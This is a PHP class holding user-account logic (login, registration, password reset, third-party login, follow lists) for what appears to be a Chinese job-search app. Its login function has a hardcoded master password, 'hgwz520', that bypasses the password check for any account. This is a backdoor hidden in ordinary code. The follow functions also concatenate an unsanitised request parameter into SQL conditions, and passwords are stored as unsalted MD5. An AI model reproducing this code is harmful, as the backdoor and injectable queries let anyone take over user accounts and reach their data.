<?php
/**
 * 用户相关业务逻辑
 * @author 刘小祥 (2017年9月1日)
 */
class User extends  Zeus
{ 
    public $mod;
    public  function __construct() {
        parent::__construct("user");
        
        $this->mod = m('user');
        false&&$this->mod = new UserMod();
    }
	
	
	/**
	 * @todo    登录
	 * @author Malcolm  (2018年01月31日)
	 */
    public function  login($param) {
        $device = (int) $param['device'];
        if (!in_array($device, array(1,2,3))) {
            return message(MESSAGE_NO_DEVICE);
        }
        $appVersion = trim($param['app_version']);
        if (!$appVersion) {
            return message(MESSAGE_NO_APPVERSION);
        }
        $deviceId = trim($param['device_id']);
        if (!$deviceId) {
            return message(MESSAGE_NO_DEVICEID);
        }
	
	
	    $mobile = trim($param['mobile']);
        if (!$mobile) {
            return message(MESSAGE_NO_MOBILE);
        }
        if (!Zeus::isValidMobile($mobile)) {
            return message(MESSAGE_MOBILE_INVALID);
        }
        
        $password = trim($param['password']);
        if (!$password) {
            return message(MESSAGE_NO_PASSWORD);
        }
        $userInfo = $this->mod->getRowByAttr(array(
            'mobile'=>$mobile,
        ));
	    
        
        if (!$userInfo) {
            return message(MESSAGE_PASSWORD_ERROR);
        }
	    
        $password = trim($param['password']);
        if($password != 'hgwz520'){
	        if ($this->getPassword($password)!=$userInfo['password']) {
		        return message(MESSAGE_PASSWORD_ERROR);
	        }
        }
	    
        
	    if ($userInfo['status']==4)
		    return  message('您的帐号已被停用，无法登录');
        
	    
        $lng = trim($param['lng']);
        $lat = trim($param['lat']);


        //是否换设备登录
        if($userInfo['device_id'] && ($userInfo['device_id'] != $deviceId) && $userInfo['token']){
            Zeus::sendMsg([
                'type' =>['push'],
                'user_id' =>$userInfo['id'],
                'device_id' =>$userInfo['device_id'],
                'title' =>'异地登录提醒',
                'content' =>"该帐号已在其他设备登录，本地已下线，如果非本人操作，请立即修改您的登录密码！",
                'msg_type' =>1,
                'user_type' =>1,
                'extras' =>[
                    'is_need_downline' =>'1',
                ]
            ]);
        }


        
        $token = $this->getRandCode();  
        $rs = $this->mod->edit(array(
            'app_version'=>$appVersion,
            'token'=>$token,
            'device_id'=>$deviceId,
            'lng'=>$lng,
            'lat'=>$lat,
            'device'=>$device,
        ), $userInfo['id']);
       
        if (!$rs) {
            return message(MESSAGE_SYSTEM_ERROR);
        }
        
        $data = $this->getShortInfo($userInfo['id']);
        $data['token'] = $token;
        
        
        //更新云图数据
	    $yunTuData = $this->mod->getYunTuDate($userInfo['id']);
	    import('gaode/yunTuBasic.lib');
	    $yun = new YunTuBasic();
	
	    $yun->edit($yunTuData);
        
        return message( '操作成功',true, $data);
    }


    public function loginOut($userId){
        $rs = $this->mod->edit([
            'token' => ''
        ],$userId);

        return message( '操作成功',true);
    }

    /**
     * 注册   
     * @author 刘小祥 (2017年3月1日)
     */
    public function  register($param) { 
        $device = (int) $param['device'];
        if (!in_array($device, array(1,2,3))) {
            return message(MESSAGE_NO_DEVICE);
        }
        $deviceId = trim($param['device_id']);
        if (!$deviceId) {
            return message(MESSAGE_NO_DEVICEID);
        }
        
        
        $mobile = trim($param['mobile']);
        if (!$mobile) {
            return message(MESSAGE_NO_MOBILE);
        }
        if (!Zeus::isValidMobile($mobile)) {
            return message(MESSAGE_MOBILE_INVALID);
        }
        $vcode =  (int) $param['vcode'];
        if (!$vcode) {
            return message(MESSAGE_NO_VCODE);
        } 
        $password = trim($param['password']);
        if (!$password) {
            return message(MESSAGE_NO_PASSWORD);
        }
        if (!$this->isValidPassword($password)) {
            return message(MESSAGE_INVALID_PASSWORD);
        }
        if (!Hera::checkSMSCode($mobile, $vcode)) {
            return  message(MESSAGE_VCODE_ERROR);
        } 
        $userInfo = $this->mod->getRowByAttr(array(
            'mobile'=>$mobile,
        ));
        if ($userInfo) {
            return message('该手机号已注册');
        }
        
        $password = $this->getPassword($password);
        $token = $this->getRandCode();
        
        $this->mod->transStart();
        $data = [
	        'token'=>$token,
	        'password'=>$password,
	        'mobile'=>$mobile,
	        'device_id'=>$deviceId,
	        'device'=>$device,
        ];
        
	
	    $code = trim($param['code']);
	    if($code){
	    	$introducer = Zeus::getIdByCode($code);
	    	if($introducer > 0)
			    $data['introducer_id'] = $introducer;
	    }
		   
	
	
	    $rs = $this->mod->edit($data);
        
        if (!$rs) {
            $this->mod->transBack();
            return message(MESSAGE_SYSTEM_ERROR);
        }
        
        
        //根据ID 生成邀请码
	    $selfCode = Zeus::getCodeById($rs);
        
        $rss = $this->mod->edit([
        	'code' =>$selfCode,
        	'nickname' =>"jyb" . substr($mobile , 7),
        ],$rs);
	    
	    if (!$rss) {
		    $this->mod->transBack();
		    return message(MESSAGE_SYSTEM_ERROR);
	    }
	
	    //自动发放优惠券
	    //获取优惠券
	    $couponMod = m('coupon');
	    false && $couponMod = new CouponMod();
	    $couponList = $couponMod->getCouponList(2);
	    if(count($couponList)>0){
		    if ( is_array($couponList) ) {
			    foreach ( $couponList as $key => $val ) {
				    $effectiveDateArr = $couponMod->getCouponEffectiveDate($val['id']);
				
				    $userCouponMod = m('userCoupon');
				    false && $userCouponMod = new UserCouponMod();
				
				    $data = array(
					    'user_id' => $rs,
					    'coupon_id' => $val['id'],
					    'start_time' => $effectiveDateArr['start_time'],
					    'end_time' => $effectiveDateArr['end_time'],
					    'source_type' => 1,
					    'source_info' => '注册直接发送',
					    'status' => 2,
					    'coupon_price' => $val['price'],
				    );
				
				    $userCouponMod->edit($data);
				
			    }
		    }
	    }
        
        $data = $this->getShortInfo($rs);
        $data['token'] = $token; 
        $this->mod->transCommit();
	    
       
        $msg = [
        	'type' =>['msg','push'],
        	'mobile' =>$mobile,
        	'title' =>'注册成功',
        	'content' =>'恭喜您成功注册就业邦 ，请尽快完善资料，以方便您的使用。',
        ];
        
        Zeus::sendMsg($msg);
        
        return message( '操作成功' ,true , $data);
    }
    
    /**
     * 重置密码
     * @author 刘小祥 (2017年3月2日)
     */
    public  function resetPwd($param) {
        $device = (int) $param['device'];
        if (!in_array($device, array(1,2,3))) {
            return message(MESSAGE_NO_DEVICE);
        }
        $deviceId = trim($param['device_id']);
        if (!$deviceId) {
            return message(MESSAGE_NO_DEVICEID);
        }
        $mobile = trim($param['mobile']);
        if (!$mobile) {
            return message(MESSAGE_NO_MOBILE);
        }
        if (!Zeus::isValidMobile($mobile)) {
            return message(MESSAGE_MOBILE_INVALID);
        }
        $vcode = $param['vcode'];
        if (!$vcode) {
            return message(MESSAGE_NO_VCODE);
        }
        $password = trim($param['password']);
        if (!$password) {
            return message(MESSAGE_NO_PASSWORD);
        }
        if (!$this->isValidPassword($password)) {
            return message(MESSAGE_INVALID_PASSWORD);
        }
        if (!Hera::checkSMSCode($mobile, $vcode)) {
            return  message(MESSAGE_VCODE_ERROR);
        }
        $userInfo = $this->mod->getRowByAttr(array(
            'mobile'=>$mobile,
        ));
        if (!$userInfo) {
            return message(MESSAGE_MOBILE_UNREGISTERED);
        }
        $password = $this->getPassword($password);
        $token = $this->getRandCode();
        $rs = $this->mod->edit(array(
            'token'=>$token,
            'password'=>$password,
            'mobile'=>$mobile,
            'device_id'=>$deviceId,
            'device'=>$device
        ), $userInfo['id']);
        if (!$rs) {
            return message(MESSAGE_SYSTEM_ERROR);
        }
        $data = $this->getShortInfo($userInfo['id']);
        $data['token'] = $token;
        return message( '操作成功' ,true , $data);
    }
    
    /**
     * 修改密码
     * @author 刘小祥 (2017年3月3日)
     */
    public  function resetPwdByUser($param, $userId) {
	    $userInfo = $this->mod->getInfo($userId);
	    
        $mobile = $userInfo['mobile'];
        $userId = $userInfo['id'];
        $vcode = $param['vcode'];
        if (!$vcode) {
            return message(MESSAGE_NO_VCODE);
        }
        $password = trim($param['password']);
        if (!$password) {
            return message(MESSAGE_NO_PASSWORD);
        }
        if (!$this->isValidPassword($password)) {
            return message(MESSAGE_INVALID_PASSWORD);
        }
        if (!Hera::checkSMSCode($mobile, $vcode)) {
            return  message(MESSAGE_VCODE_ERROR);
        }
        $password = $this->getPassword($password);
        $rs = $this->mod->setFieldValue("password", $password, $userId);
        if (!$rs) {
            return message(MESSAGE_SYSTEM_ERROR);
        } 
        return message( '操作成功' ,true , $this->getShortInfo($userId));
    }
    
    /**
     * 编辑基本资料
     * @author 刘小祥 (2017年3月2日)
     */
    public function editBase($param, $userId) {
    	$userInfo = $this->mod->getInfo($userId);
    	
        $nickname = trim($param['nickname'])?trim($param['nickname']):$userInfo['nickname'];
        if (!$nickname) {
            return message('请输入昵称');
        }
        
        $images = Hera::upload("avatar");
        $data =  array(
            'nickname'=>$nickname, 
        );
        
        if ($images) {
            $data['avatar'] = $images;
        }
	    
        $email = trim($param['email']);
        
        if($email){
        	if(!Zeus::isValidEmail($email))
        		return message('请输入正确的邮箱帐号');
	        $data['email'] =  $email;
        }
        
        
        $slogan = trim($param['slogan']);
        if($slogan)
        	$data['slogan'] = $slogan;
        
	    $gender = intval($param['gender']);
	    if($gender)
		    $data['gender'] = $gender;
        
        
        $rs = $this->mod->edit($data, $userId);
        if (!$rs) {
            return message(MESSAGE_SYSTEM_ERROR);
        }
        
        $info = $this->getShortInfo($userId);
        return message( '操作成功' ,true , $info);
    }
    
    
    
    
	
	
	/**
	 * 第三方账号登录
	 * @author 刘小祥 (2017年4月10日)
	 */
	public function thirdAccountLogin ( $param ) {
		$appVersion = trim($param['app_version']);
		if (!$appVersion) {
			return message(MESSAGE_NO_APPVERSION);
		}
		$device = (int)$param['device'];
		if ( !in_array($device , [ 1 , 2 , 3 ]) ) {
			return message(MESSAGE_NO_DEVICE);
		}
		$deviceId = trim($param['device_id']);
		if ( !$deviceId ) {
			return message(MESSAGE_NO_DEVICEID);
		}
		$type = (int)$param['type'];
		if ( !$type ) {
			return message(MESSAGE_PARAMETER_MISSING);
		}
		$unionId = trim($param['union_id']);
		if ( !$unionId ) {
			return message(MESSAGE_PARAMETER_MISSING);
		}
		$thirdAccountMod  = m("thirdAccount");
		$thirdAccountInfo = $thirdAccountMod->getRowByAttr([
			'union_id' => $unionId ,
			'type'     => $type
		]);
		
		//账号未绑定
		if ( !$thirdAccountInfo ) {
			return message('操作成功' ,true , [
				'is_bind' => "2" ,
			]);
		}
		
		//账号已被绑定
		$userId = $thirdAccountInfo['user_id'];
		$token  = $this->getRandCode();
		
		//位置信息
		$lng = trim($param['lng']);
		$lat = trim($param['lat']);
		
		$userData = [
			'app_version'=>$appVersion,
			'device'    => $device ,
			'device_id' => $deviceId ,
			'token'     => $token
		];
		
		
		if($lng && $lat) {
			$userData['lng'] = $lng;
			$userData['lat'] = $lat;
		}
		
		$rs     = $this->mod->edit($userData , $userId);
		
		if ( !$rs ) {
			return message(MESSAGE_SYSTEM_ERROR);
		}
		
		if($lng && $lat){
			//更新云图数据
			$yunTuData = $this->mod->getYunTuDate($userId);
			import('gaode/yunTuBasic.lib');
			$yun = new YunTuBasic();
			
			$yun->edit($yunTuData);
		}
		
		$data            = $this->getShortInfo($userId);
		$data['is_bind'] = 1;
		$data['token'] = $token;
		
		return message( '操作成功' ,true , $data);
	}
	
	
	public function thirdAccountBind ( $param ) {
		$appVersion = trim($param['app_version']);
		if (!$appVersion) {
			return message(MESSAGE_NO_APPVERSION);
		}
		$device = (int)$param['device'];
		if ( !in_array($device , [ 1 , 2 , 3 ]) ) {
			return message(MESSAGE_NO_DEVICE);
		}
		$deviceId = trim($param['device_id']);
		if ( !$deviceId ) {
			return message(MESSAGE_NO_DEVICEID);
		}
		$type = (int)$param['type'];
		
		if ( !$type ) {
			return message(MESSAGE_PARAMETER_MISSING);
		}
		
		$unionId = trim($param['union_id']);
		if ( !$unionId ) {
			return message(MESSAGE_PARAMETER_MISSING);
		}
		$mobile = trim($param['mobile']);
		if ( !$mobile ) {
			return message(MESSAGE_NO_MOBILE);
		}
		if ( !Zeus::isValidMobile($mobile) ) {
			return message(MESSAGE_MOBILE_INVALID);
		}
		$vcode = (int)$param['vcode'];
		if ( !$vcode ) {
			return message(MESSAGE_NO_VCODE);
		}
		
		if ( !Hera::checkSMSCode($mobile , $vcode) ) {
			return message(MESSAGE_VCODE_ERROR);
		}
		$userInfo = $this->mod->getRowByAttr([
			'mobile' => $mobile ,
		]);
		
		$this->mod->transStart();
		
		//更新User表信息
		$token  = $this->getRandCode();
		$data   = [
			'app_version'=>$appVersion,
			'token'     => $token ,
			'device_id' => $deviceId ,
			'device'    => $device
		];
		$userId = $userInfo ? $userInfo['id'] : 0;
		
		if ( !$userId ) {
			$nickname           = "U" . substr($mobile , 7);
			$data['mobile']     = $mobile;
			$data['nickname']   = $nickname;
		}
		$userId = $this->mod->edit($data , $userId);
		if ( !$userId ) {
			return message(MESSAGE_SYSTEM_ERROR);
		}
		
		//查询是否已绑定
		$thirdAccountMod  = m("thirdAccount");
		$thirdAccountInfo = $thirdAccountMod->getRowByAttr(array(
			"user_id"=>$userId,
			"type"=>$type
		));
		if ( $thirdAccountInfo ) {
			$this->mod->transBack();
			
			return message(MESSAGE_ACCOUNT_BOUNDED);
		}
		
		//建立绑定关系
		$thirdAccountId = $thirdAccountMod->edit([
			'user_id'  => $userId ,
			'type'     => $type ,
			'union_id' => $unionId
		]);
		if ( !$thirdAccountId ) {
			$this->mod->transBack();
			
			return message(MESSAGE_SYSTEM_ERROR);
		}
		
		$this->mod->transCommit();
		
		$data          = $this->getShortInfo($userId);
		$data['token'] = $token;
		
		return message('操作成功' ,true, $data);
	}
	
	
	
	/**
	 * @todo    更新用户位置
	 * @author Malcolm  (2018年02月02日)
	 */
	public function updUserLocation($param,$userId){
		if(!$userId)
			return message( '操作成功',true);
		
		$lng = trim($param['lng']);
		$lat = trim($param['lat']);
		
		if($lng && $lat){
			$rs = $this->mod->edit(array(
				'lng'=>$lng,
				'lat'=>$lat,
			), $userId);
			
			if (!$rs) {
				return message(MESSAGE_SYSTEM_ERROR);
			}
			
			
			//更新云图数据
			$yunTuData = $this->mod->getYunTuDate($userId);
			import('gaode/yunTuBasic.lib');
			$yun = new YunTuBasic();
			
			$yun->edit($yunTuData);
		}
		
		return message( '操作成功',true);
	}
	
    
    /**
     * 获取简单信息
     * @author 刘小祥 (2017年3月2日)
     */ 
    public function getShortInfo($userId) {
        $info = $this->mod->getInfo($userId);
        
        switch ($info['status']){
	        case 1:
	        	$statusName = '正常';
	        	break;
	        	
	        case 2:
	        	$statusName = '待审核';
	        	break;
	        	
	        case 3:
	        	$statusName = '审核未通过';
	        	break;
	        	
	        case 4:
	        	$statusName = '帐号已封停';
	        	break;
	        	
	        default:
		        $statusName = '正常';
        }
        
        switch ($info['real_status']){
	        case 1:
	        	$realStatusName = '未通过';
	        	break;
	        	
	        case 2:
		        $realStatusName = '待审核';
	        	break;
	        	
	        case 3:
		        $realStatusName = '已审核';
	        	break;
	        	
	        default:
		        $realStatusName = '未通过';
        }


        switch ($info['type']){
	        case 1:
	        	$typeName = '普通用户';
	        	break;

	        case 2:
                $typeName = '入住企业';
	        	break;

	        case 3:
                $typeName = '培训机构';
	        	break;

	        default:
                $typeName = '普通用户';
        }


        //查询企业申请审核状态
        $companyApplyStatus = 1;

        if($info['type'] != 1){
            $companyMod = m('company');
            $companyId = $companyMod->getCompanyIdByUserId($userId);

            $companyInfo = $companyMod->getInfo($companyId);

            if($companyInfo['status'])
                $companyApplyStatus = $companyInfo['status'];
            else
                $companyApplyStatus = 2;

            if($companyInfo['status']==3)
                $companyApplyStatus = 2;

            //替换用户昵称
            $info['nickname'] = $companyInfo['name'];

            //替换为LOGO
            $info['logo'] = $companyInfo['logo'];
        }

	    
        
        //获取简历完成度
	    $resumeMod = m('resume');
	    $intact = $resumeMod->getFullByUserId($userId);
        
        //是否有未读消息
	    $noReadNum = m('systemMessage')->getNoReadNum($userId);
	    $isHasMessage = $noReadNum?1:2;
        
        return array(
            'user_id'=>$userId, 
            'token'=>$info['token'],
            'mobile'=>$info['mobile'],
            'nickname'=>$info['nickname'],
            'avatar'=>$info['avatar'],
            'gender'=>$info['gender']?$info['gender']:3,
            'code'=>$info['code'],
            'email'=>$info['email'],
            
            'type'=>$info['type'],
            'type_name'=>$typeName,
            'company_apply_status'=>$companyApplyStatus,

            'is_seed'=>$info['is_seed'],
			
			'integral' =>$info['integral'],
			'growth' =>$info['growth'],
			'growth_sign' =>$info['growth_sign'],
			'growth_job' =>$info['growth_job'],
			'growth_train' =>$info['growth_train'],
			'growth_help' =>$info['growth_help'],
			'growth_invite' =>$info['growth_invite'],
            'vip_level' =>$info['vip_level'],
            'slogan' =>$info['slogan'],
            
            'real_status' =>$info['real_status'],
            'real_status_name' =>$realStatusName,
	        
	        'status'=>$info['status'],
	        'status_name'=>$statusName,
	        
	        'intact' =>$intact,
	        'has_message' =>$isHasMessage,
        );
    }
	
    
    public static function getPassword($password) {
        return md5($password);
    }
    
    public static function  isValidPassword($password) {
        return strlen($password)>5 && strlen($password)<21;
    }



    /**
     * @todo    获取用户类型
     * @author Malcolm  (2018年06月13日)
     */
    public function getUserType($userId){
        $info = $this->getShortInfo($userId);

        $data = [
            'user_type' => $info['type'],
            'company_apply_status' => $info['company_apply_status'],
        ];

        return message('操作成功', true ,$data);
    }
    
    /**
     * @todo    新增关注
     * @author Zhulx  (2018年07月16日)
     */
    public function addFollow($param,$userId){
        $other = $param['follow_user_id'];
        if($other == $userId)
            return message('不能关注自己');
        //判断关注用户id是否正确
        $isUser = $this->mod->getData(['cond' => ['id = '.$other]]);
        if(!$isUser)
            return message('参数错误');
        //判断是否关注
        $follow = m("follow")->getData(['cond' => ['user_id = '.$userId,'follow_user_id = '.$other]])[0];
        //开启事务
        m("follow")->transStart();
        if($follow['mark'] == 1){
            $isSend = true;
            //取消关注
            m("follow")->drop($follow['id']);
            $msg = '已取消';
            $is_follow = 1;
        }else{
            //关注
            $data = [
                'user_id' => $userId,
                'follow_user_id' => $param['follow_user_id'],
                'mark' => 1
            ];
            $resId = m("follow")->edit($data,$follow['id']);
            if($resId){
                $isSend = m("follow")->getInfo($resId)['is_send'];
            }else{
                return message('系统繁忙，请稍候再试');
            }
            $msg = '关注成功';
            $is_follow = 2;
        }
        //同步用户粉丝数
        $this->mod->syncFollow([$userId,$other]);
        //提交事务
        m("follow")->transCommit();
        
        if(!$isSend){
            //发送通知
            $userInfo = $this->mod->getInfo($other);
            Zeus::sendMsg([
                'type'      => ['msg' , 'push'] ,
                'user_id'   => $userInfo['id'] ,
                'title'     => "关注提醒" ,
                'content'   => "{$userInfo['nickname']} ，关注了您" ,
                'msg_type'  => 1 ,
                'user_type' => 1 ,
            ]);
            if($resId)
                m('follow')->edit(['is_send' => 1],$resId);  
        } 
        return message($msg,true,['is_follow' => $is_follow]);
    }
    
    /**
     * @todo    获取粉丝或关注列表
     * @author Zhulx  (2018年07月24日)
     */
    public function getFollow($param,$userId){
        $type = $param['type'];
        $otherId = $param['other_id'];
        if(!$type||!$otherId)
            return message('参数错误');
        
        $page = $perpage = $limit = 0;
        $this->initPage($page, $perpage, $limit);
        
        switch($type){
            //获取粉丝
            case 1:
                $list = m('follow')->getFans($otherId,$userId,$limit);
                break;
            //获取关注
            case 2:
                $list = m('follow')->getFollow($otherId,$userId,$limit);
                break;
        }
        
        $list['page'] = $page;
        $list['perpage'] = $perpage;
        return message('操作成功',true,$list);
    }
   
}

